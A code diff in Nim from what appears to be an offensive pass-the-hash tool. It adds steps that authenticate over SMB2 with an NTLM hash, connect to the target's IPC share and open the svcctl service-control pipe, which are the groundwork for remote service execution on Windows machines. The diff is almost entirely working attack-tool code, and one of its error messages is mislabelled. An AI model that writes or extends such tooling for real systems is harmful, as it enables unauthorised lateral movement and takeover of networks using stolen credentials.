@@ -38,11 +38,23 @@ when isMainModule:
     if(not NegotiateSMB2(tcpSocket,addr messageID,addr treeID, addr sessionID)):
         echo "[!] Problem in NegotiateSMB2 request!"
         quit(0)
-    if(not NTLMSSPNegotiateSMB2(tcpSocket,addr optionsStruct,smbNegotiateFlags,smbSessionKeyLength,addr messageID,addr treeID, addr sessionID)):
-        echo "[!] Problem in NTLMSSPNegotiateSMB2 request!"
+    if(not NTLMAuthentication(tcpSocket,addr optionsStruct,smbNegotiateFlags,smbSessionKeyLength,addr messageID,addr treeID, addr sessionID)):
+        echo "[!] Problem in NTLM Authentication requests!"
         quit(0)
     if(optionsStruct.IsVerbose):
         echo "[+] NTLM Authentication with Hash is succesfull!"
+    if(not TreeConnectRequest(tcpSocket,addr optionsStruct, addr messageID, addr treeID, addr sessionID)):
+        echo "[!] Problem in Tree Connect Request!"
+        quit(0)
+    if(optionsStruct.IsVerbose):
+        echo "[+] Connected to IPC Share of target!"
+    if(not CreateRequest(tcpSocket,addr optionsStruct, addr messageID, addr treeID, addr sessionID)):
+        echo "[!] Problem in Tree Connect Request!"
+        quit(0)
+    if(optionsStruct.IsVerbose):
+        echo "[+] Opened a handle for svcctl pipe!"
+    
+
     
     
     
